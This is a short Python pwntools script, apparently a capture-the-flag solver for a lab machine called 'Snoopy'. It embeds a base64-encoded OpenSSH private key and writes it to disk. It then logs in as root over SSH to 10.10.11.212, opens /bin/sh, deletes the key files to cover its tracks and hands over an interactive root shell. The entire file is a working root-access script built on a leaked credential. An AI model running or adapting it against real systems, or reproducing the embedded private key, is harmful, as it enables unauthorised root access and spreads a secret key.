from pwn import *
import subprocess
import string
import argparse
import time
import os
import base64



try:
    print("\n[\033[1;32m+\033[1;37m] Snoopy - Ninhpn1337\n")
    time.sleep(0.5)

except:
    print('\n[\033[1;31m!\033[1;37m] Root please\n\n[\033[1;31m!\033[1;37m] \n')
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Quit!\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

f = open("b64", "a")
f.write("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUExNTYwelUzajdtRlFVczVYREdJYXJ0aC9pTVVGNlcyb2dzVzBLUEZOOE1mZkV4ejJHOUQvCjRncFlqSWN5YXVQSFNyVjRmak5HTTQ2QWl6RFRRSW9LNk15TjRLOFBOellNYVZuQjZJTUc5QVZ0aEV1MTFuWXpvcUhtQmYKaHkwY3A0RWFNM2dJVGExMEFNQkFibnYyYlF5V2hWWmFRbFNRNUhESHQwRHcxbVdCdWU1ZWF4ZXVxVzNSWUpHaktqdUZTdwprZldzU1ZyTFRoNXZmMGdhVjFxbDU5V2M4R2g3SUtGckVFY0xYTHFxeURvcHJLcTJaRzA2UzJmb2VVV2tTWTEzNFV6OW9JCkN0cWYxNmxMRmk0TG03dDVqa2hXOVl6RFJoYTdPbTV3cHh1Y1VqUUNHNWRVL0lqMUJBNWpFOEc3NVBBTHJFUi80ZElwMlUKenJYeHMvMlFxaS80VFBqRkpaNVl5YWZvclRCL25tTzNESmF3bzZiY2xBQTc2Mm45YmRrdmx4V2QxNHZpZzU0eVA3U1NYVQp0UEd2UDRWcGp5TDdOY1BlTzdKcmY2MlVWamxtZHJvNXhhSG5idUtGZXZ5UEhYbVNRVUU0eVUzU2RROWxyZXBZL2VoNGVOCnkwUUpHN1FVdjhaNDlxSG5sandNVENjTmVINkRmYzc4NmpYZ3VFbHpBQUFGaUFPc0o5SURyQ2ZTQUFBQUIzTnphQzF5YzIKRUFBQUdCQU5lZXRNMU40KzVoVUZMT1Z3eGlHcTdZZjRqRkJlbHRxSUxGdENqeFRmREgzeE1jOWh2US8rSUtXSXlITW1yagp4MHExZUg0elJqT09nSXN3MDBDS0N1ak1qZUN2RHpjMkRHbFp3ZWlEQnZRRmJZUkx0ZFoyTTZLaDVnWDRjdEhLZUJHak40CkNFMnRkQURBUUc1NzltME1sb1ZXV2tKVWtPUnd4N2RBOE5abGdibnVYbXNYcnFsdDBXQ1JveW83aFVzSkgxckVsYXkwNGUKYjM5SUdsZGFwZWZWblBCb2V5Q2hheEJIQzF5NnFzZzZLYXlxdG1SdE9rdG42SGxGcEVtTmQrRk0vYUNBcmFuOWVwU3hZdQpDNXU3ZVk1SVZ2V013MFlXdXpwdWNLY2JuRkkwQWh1WFZQeUk5UVFPWXhQQnUrVHdDNnhFZitIU0tkbE02MThiUDlrS292CitFejR4U1dlV01tbjZLMHdmNTVqdHd5V3NLT20zSlFBTyt0cC9XM1pMNWNWbmRlTDRvT2VNaiswa2wxTFR4cnorRmFZOGkKK3pYRDNqdXlhMyt0bEZZNVpuYTZPY1doNTI3aWhYcjhqeDE1a2tGQk9NbE4wblVQWmEzcVdQM29lSGpjdEVDUnUwRkwvRwplUGFoNTVZOERFd25EWGgrZzMzTy9PbzE0TGhKY3dBQUFBTUJBQUVBQUFHQUJubU5sRnl5YTRZZ2sxdis0VEJRL004amhVCmZsVlkwbGNrZmRrUjB0NmYwV2hjeG8xNHovSWhxTmJpcmhLTFNPVjMvN2prNmIzUkI2YTdPYnBHU0F6MXpWSmRvYjZ0eUUKb3VVL0hXeFIyU0lRbDlodUxYSi9Pbk1DSlV2QXB1d2RqdW9IMEtRc3Jpb09NbERDeE15aG1HcTVwY080R3VtQzJLMGNYeApkWDYyMW82QjUxVmV1VmZDNGROOXd0Ym11Y29jVnUxd1VTOWRXVUk0NVd2Q2pNc3BtSGpQQ1dRZlNXOG5ZdnNTa3AxN2xuClp2ZjVZaXFsaFg0cFRQcjZZL3NMZ0dGMDRNL21HcHFza1NkZ3B4eXBCaEQ3bUZFa2pIN3pOL2REb1JwOWNhNElTZVRWdlkKWW5VSWJERVRXYUwrSXNybTJibE9ZMTYwWjhDU0FNV2o0ejVnaVY1bkx0SXZBRm9EYmFvSHZVenJuaXI1N3d4bXExOUdydAo3T2JacXBiQmhYL0d6aXRzdE84RVVlZkc4TWxDK0NNOGpBdEFpY0F0WTdXVGlrTFJYR3ZVOTNRL2NTMG5ScTB4Rk0xT0VRCnFiNkFRQ0JOVDUzckJVWlNTL2Nad2RwUDJrdVBQYnkwdGhwYm5jRzEzbU1ETnNwRzBnaE5NS3FKK0tuelRDeHVtQkFBQUEKd0VJRi9wMnlaZmhxWEJaQUo5YVVLL1RFN3U5QW1nVXZ2dnJ4Tkl2ZzU3L3h3dDl5aG9Fc1djRWZNUUVXd3J1N3k4b0gyZQpJQUZweTlnSDBKMlVlMVF6QWlKaGhibDF1aXhmKzJvZ2NzNC9GNm44U0NTSWN5WHViMTRZcnl2eUdyTk9KNTV0ckJlbFZMCkJNbGJibXlqZ2F2YzZkNmZuMmthNnVrRmluK095V1RoL2d5SjJMTjVWSkNzUTNNK3FvcGZxRFBFM3BUcjBNdWVhRDQrY2gKazVxTk9Ua0dzbjYwS1JHWThraktoVHJOM085V1NWR01HRjE3MUo5eHZYNm03aURRQUFBTUVBL2M2QUdFVENRbkIzQVpweQoyY0h1NmFOMHNuNlZsK3Rxb1VCV2hPbE9BcjdPOVVyY3pSMW5ONHZvMFRNVy9WRW1raERnVTU2bkhtemQwckthdWd2VFJsCmI5TU5RZy9ZWm1yWkJuSG1VQkN2YkN6cS80dGo0NU11SHEyYlVNSWFVS3BrUkdZMWN2MUJIKzA2TlYwaXJUU3VlL3I2NFUKK1dKeUt5bDRrK29xQ1BDQWdsNHJSUWlMZnRLZWJSQWdZNyt1TWhGQ282M1c1TlJBcGNkTytzMG03bEFycGoyclZCMW9MdgpkeWRxKzY4Q1h0S3U1V3JQMHVCMW9EcDNCTkNTaDlBQUFBd1FEWmU3bVlRMWhZNFdvWjNHMGFESmhxMWdCT0tWMkhGUGY0CjlPMTVSTFhuZTZxdENOeFpwRGp0M3U3NjQ2L2FOMzJ2N1VWekdWN3R3NGsvSDhQeVU4MTlSOUdjQ1I0d3lkTGNCNGJZNGIKTlEvbllnalN2SWlGUm5QMUFNN0VpR2JOaHJjaFVlbFJxMFJEdWdtNGh3Q3k2Zlh0MHJHeTI3YlIrdWNIaTFXK25qYmE2ZQpTTi9zakhhMTlIa1pKZUxjeUdtVTM0L0VTeU42SHFGTE9YZnlHanFUbGR3VlZ1dHJFL012a20zaWkvMEdxRGtxVzNQd2dXCmF0VTBBd0h0Q2F6SzhBQUFBUGNtOXZkRUJ6Ym05dmNIa3VhSFJpQVFJREJBPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==")
f.close()

with open('b64', 'r') as input_file:
  coded_string = input_file.read()
decoded = base64.b64decode(coded_string)
with open('key', 'w', encoding="utf-8") as output_file:
  output_file.write(decoded.decode("utf-8"))



request = ssh(host='10.10.11.212', user='root', keyfile='key') 
shell = request.process("/bin/sh")
time.sleep(0.5)
os.remove("key")
os.remove("b64")
shell.sendline(b"whoami")
shell.interactive()
